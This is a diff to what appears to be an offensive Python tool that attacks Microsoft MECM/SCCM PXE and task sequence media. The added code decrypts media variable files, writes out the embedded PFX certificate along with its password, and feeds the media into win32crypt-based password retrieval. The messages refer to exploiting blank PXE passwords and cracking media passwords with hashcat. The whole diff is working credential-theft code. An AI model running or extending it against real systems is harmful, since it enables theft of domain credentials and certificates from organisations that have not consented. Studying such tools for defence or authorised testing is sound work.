@@ -326,7 +326,7 @@ def get_pxe_files(ip):
             else:
                 print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
     else:
-        print("[+] User configured password detected for PXE in MECM")
+        print("[+] User configured password detected for task sequence media. Attempts can be made to crack this password using the relevant hashcat module")
 
 def generateSignedData(data,cryptoProv):
 
@@ -470,7 +470,7 @@ def use_encrypted_key(encrypted_key, media_file_path):
     if osName == "Windows":
         process_pxe_bootable_and_prestaged_media(media_variables)
     else:
-        print("[!] Automatically retrieving passwords not possible without win32crypt")
+        print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")
 
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
@@ -880,7 +880,23 @@ if __name__ == "__main__":
 
         path = sys.argv[2]
         media_variables = decrypt_media_file(path,password)
-        process_pxe_bootable_and_prestaged_media(media_variables)
+        print("[!] Writing media variables to variables.xml")
+        write_to_file("variables",media_variables) 
+    
+        #Parse media file in order to pull out PFX password and PFX bytes
+        root = ET.fromstring(media_variables.encode("utf-16-le"))
+        smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
+        smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
+        smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
+        filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
+    
+        print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
+        write_to_binary_file(filename,smsTSMediaPFX)
+    
+        if osName == "Windows":
+            process_pxe_bootable_and_prestaged_media(media_variables)
+        else:
+            print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")
 
     elif int(sys.argv[1]) == 4:
         print("[+] Attempting to decrypt encrypted media variables file and policy from stand-alone media...")
